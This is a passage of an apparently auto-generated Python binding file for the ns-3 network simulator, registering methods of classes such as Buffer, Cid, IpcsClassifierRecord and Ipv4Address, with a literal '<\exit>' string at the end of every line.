[param('ns3::TagBuffer', 'buffer')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3AsciiTraceHelper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AsciiTraceHelper const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateFileStream',<\exit>
'ns3::Ptr< ns3::OutputStreamWrapper >',<\exit>
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode', default_value='std::ios_base::out')])<\exit>
cls.add_method('DefaultDequeueSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultDequeueSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultDropSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultDropSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultEnqueueSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultEnqueueSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultReceiveSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultReceiveSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('GetFilenameFromDevice',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])<\exit>
cls.add_method('GetFilenameFromInterfacePair',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])<\exit>
return<\exit>
def register_Ns3AsciiTraceHelperForDevice_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AsciiTraceHelperForDevice const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::Ptr< ns3::NetDevice >', 'nd')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'ndName')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NetDeviceContainer', 'd')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NodeContainer', 'n')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'explicitFilename')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid')])<\exit>
cls.add_method('EnableAsciiAll',<\exit>
'void',<\exit>
[param('std::string', 'prefix')])<\exit>
cls.add_method('EnableAsciiAll',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream')])<\exit>
cls.add_method('EnableAsciiInternal',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeConstructionList_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeConstructionList const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker'), param('ns3::Ptr< ns3::AttributeValue >', 'value')])<\exit>
cls.add_method('Begin',<\exit>
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('End',<\exit>
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Find',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3AttributeConstructionListItem_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::AttributeConstructionList::Item const &', 'arg0')])<\exit>
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)<\exit>
cls.add_instance_attribute('name', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('value', 'ns3::Ptr< ns3::AttributeValue >', is_const=False)<\exit>
return<\exit>
def register_Ns3Buffer_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'dataSize')])<\exit>
cls.add_constructor([param('uint32_t', 'dataSize'), param('bool', 'initialize')])<\exit>
cls.add_constructor([param('ns3::Buffer const &', 'o')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'bool',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('ns3::Buffer const &', 'o')])<\exit>
cls.add_method('AddAtStart',<\exit>
'bool',<\exit>
[param('uint32_t', 'start')])<\exit>
cls.add_method('Begin',<\exit>
'ns3::Buffer::Iterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'void',<\exit>
[param('std::ostream *', 'os'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFragment',<\exit>
'ns3::Buffer',<\exit>
[param('uint32_t', 'start'), param('uint32_t', 'length')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFullCopy',<\exit>
'ns3::Buffer',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('End',<\exit>
'ns3::Buffer::Iterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCurrentEndOffset',<\exit>
'int32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCurrentStartOffset',<\exit>
'int32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekData',<\exit>
'uint8_t const *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('RemoveAtStart',<\exit>
'void',<\exit>
[param('uint32_t', 'start')])<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3BufferIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Buffer::Iterator const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CalculateIpChecksum',<\exit>
'uint16_t',<\exit>
[param('uint16_t', 'size')])<\exit>
cls.add_method('CalculateIpChecksum',<\exit>
'uint16_t',<\exit>
[param('uint16_t', 'size'), param('uint32_t', 'initialChecksum')])<\exit>
cls.add_method('GetDistanceFrom',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator const &', 'o')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEnd',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsStart',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Next',<\exit>
'void',<\exit>
[param('uint32_t', 'delta')])<\exit>
cls.add_method('Prev',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Prev',<\exit>
'void',<\exit>
[param('uint32_t', 'delta')])<\exit>
cls.add_method('Read',<\exit>
'void',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('ReadLsbtohU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadLsbtohU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadLsbtohU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadNtohU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadNtohU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadNtohU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadU8',<\exit>
'uint8_t',<\exit>
[])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('ns3::Buffer::Iterator', 'end')])<\exit>
cls.add_method('WriteHtolsbU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteHtolsbU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteHtolsbU64',<\exit>
'void',<\exit>
[param('uint64_t', 'data')])<\exit>
cls.add_method('WriteHtonU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteHtonU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteHtonU64',<\exit>
'void',<\exit>
[param('uint64_t', 'data')])<\exit>
cls.add_method('WriteU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteU64',<\exit>
'void',<\exit>
[param('uint64_t', 'data')])<\exit>
cls.add_method('WriteU8',<\exit>
'void',<\exit>
[param('uint8_t', 'data')])<\exit>
cls.add_method('WriteU8',<\exit>
'void',<\exit>
[param('uint8_t', 'data'), param('uint32_t', 'len')])<\exit>
return<\exit>
def register_Ns3ByteTagIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagIterator const &', 'arg0')])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::ByteTagIterator::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3ByteTagIteratorItem_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagIterator::Item const &', 'arg0')])<\exit>
cls.add_method('GetEnd',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStart',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTag',<\exit>
'void',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ByteTagList_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ByteTagList const &', 'o')])<\exit>
cls.add_method('Add',<\exit>
'ns3::TagBuffer',<\exit>
[param('ns3::TypeId', 'tid'), param('uint32_t', 'bufferSize'), param('int32_t', 'start'), param('int32_t', 'end')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::ByteTagList const &', 'o')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('int32_t', 'adjustment'), param('int32_t', 'appendOffset')])<\exit>
cls.add_method('AddAtStart',<\exit>
'void',<\exit>
[param('int32_t', 'adjustment'), param('int32_t', 'prependOffset')])<\exit>
cls.add_method('Begin',<\exit>
'ns3::ByteTagList::Iterator',<\exit>
[param('int32_t', 'offsetStart'), param('int32_t', 'offsetEnd')],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAll',<\exit>
'void',<\exit>
[])<\exit>
return<\exit>
def register_Ns3ByteTagListIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagList::Iterator const &', 'arg0')])<\exit>
cls.add_method('GetOffsetStart',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::ByteTagList::Iterator::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3ByteTagListIteratorItem_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagList::Iterator::Item const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::TagBuffer', 'buf')])<\exit>
cls.add_instance_attribute('buf', 'ns3::TagBuffer', is_const=False)<\exit>
cls.add_instance_attribute('end', 'int32_t', is_const=False)<\exit>
cls.add_instance_attribute('size', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('start', 'int32_t', is_const=False)<\exit>
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)<\exit>
return<\exit>
def register_Ns3CallbackBase_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CallbackBase const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetImpl',<\exit>
'ns3::Ptr< ns3::CallbackImplBase >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::CallbackImplBase >', 'impl')],<\exit>
visibility='protected')<\exit>
cls.add_method('Demangle',<\exit>
'std::string',<\exit>
[param('std::string const &', 'mangled')],<\exit>
is_static=True, visibility='protected')<\exit>
return<\exit>
def register_Ns3Cid_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Cid const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint16_t', 'cid')])<\exit>
cls.add_method('Broadcast',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetIdentifier',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('InitialRanging',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsInitialRanging',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsPadding',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Padding',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3CidFactory_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CidFactory const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Allocate',<\exit>
'ns3::Cid',<\exit>
[param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('AllocateBasic',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('AllocateMulticast',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('AllocatePrimary',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('AllocateTransportOrSecondary',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('FreeCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('IsBasic',<\exit>
'bool',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('IsPrimary',<\exit>
'bool',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('IsTransport',<\exit>
'bool',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3CsParameters_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CsParameters const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Tlv', 'tlv')])<\exit>
cls.add_constructor([param('ns3::CsParameters::Action', 'classifierDscAction'), param('ns3::IpcsClassifierRecord', 'classifier')])<\exit>
cls.add_method('GetClassifierDscAction',<\exit>
'ns3::CsParameters::Action',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPacketClassifierRule',<\exit>
'ns3::IpcsClassifierRecord',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetClassifierDscAction',<\exit>
'void',<\exit>
[param('ns3::CsParameters::Action', 'action')])<\exit>
cls.add_method('SetPacketClassifierRule',<\exit>
'void',<\exit>
[param('ns3::IpcsClassifierRecord', 'packetClassifierRule')])<\exit>
cls.add_method('ToTlv',<\exit>
'ns3::Tlv',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3DcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBsEirp',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEirxPIrMax',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrequency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetBsEirp',<\exit>
'void',<\exit>
[param('uint16_t', 'bs_eirp')])<\exit>
cls.add_method('SetEirxPIrMax',<\exit>
'void',<\exit>
[param('uint16_t', 'rss_ir_max')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint32_t', 'frequency')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3DlFramePrefixIe_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DlFramePrefixIe const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPreamblePresent',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRateId',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStartTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetDiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'diuc')])<\exit>
cls.add_method('SetLength',<\exit>
'void',<\exit>
[param('uint16_t', 'length')])<\exit>
cls.add_method('SetPreamblePresent',<\exit>
'void',<\exit>
[param('uint8_t', 'preamblePresent')])<\exit>
cls.add_method('SetRateId',<\exit>
'void',<\exit>
[param('uint8_t', 'rateId')])<\exit>
cls.add_method('SetStartTime',<\exit>
'void',<\exit>
[param('uint16_t', 'startTime')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3EventId_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::EventId const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::EventImpl > const &', 'impl'), param('uint64_t', 'ts'), param('uint32_t', 'context'), param('uint32_t', 'uid')])<\exit>
cls.add_method('Cancel',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetContext',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTs',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsExpired',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsRunning',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekEventImpl',<\exit>
'ns3::EventImpl *',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3IpcsClassifierRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::IpcsClassifierRecord const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask'), param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask'), param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh'), param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh'), param('uint8_t', 'protocol'), param('uint8_t', 'priority')])<\exit>
cls.add_constructor([param('ns3::Tlv', 'tlv')])<\exit>
cls.add_method('AddDstAddr',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask')])<\exit>
cls.add_method('AddDstPortRange',<\exit>
'void',<\exit>
[param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh')])<\exit>
cls.add_method('AddProtocol',<\exit>
'void',<\exit>
[param('uint8_t', 'proto')])<\exit>
cls.add_method('AddSrcAddr',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask')])<\exit>
cls.add_method('AddSrcPortRange',<\exit>
'void',<\exit>
[param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh')])<\exit>
cls.add_method('CheckMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIndex',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPriority',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('uint16_t', 'cid')])<\exit>
cls.add_method('SetIndex',<\exit>
'void',<\exit>
[param('uint16_t', 'index')])<\exit>
cls.add_method('SetPriority',<\exit>
'void',<\exit>
[param('uint8_t', 'prio')])<\exit>
cls.add_method('ToTlv',<\exit>
'ns3::Tlv',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Ipv4Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Ipv4Address const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'address')])<\exit>
cls.add_constructor([param('char const *', 'address')])<\exit>
cls.add_method('CombineMask',<\exit>
'ns3::Ipv4Address',<\exit>
[param('ns3::Ipv4Mask const &', 'mask')],<\exit>
is_const=True)<\exit>
cls.add_method('ConvertFrom',<\exit>
'ns3::Ipv4Address',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('Deserialize',<\exit>
'ns3::Ipv4Address',<\exit>
[param('uint8_t const *', 'buf')],<\exit>
is_static=True)<\exit>
cls.add_method('Get',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetAny',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSubnetDirectedBroadcast',<\exit>
'ns3::Ipv4Address',<\exit>
[param('ns3::Ipv4Mask const &', 'mask')],<\exit>
is_const=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address const &', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsLocalMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsSubnetDirectedBroadcast',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Mask const &', 'mask')],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint32_t', 'address')])<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('char const *', 'address')])<\exit>
return<\exit>
def register_Ns3Ipv4Mask_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Ipv4Mask const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'mask')])<\exit>
cls.add_constructor([param('char const *', 'mask')])<\exit>
cls.add_method('Get',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInverse',<\exit>
'uint32_t',<\exit>
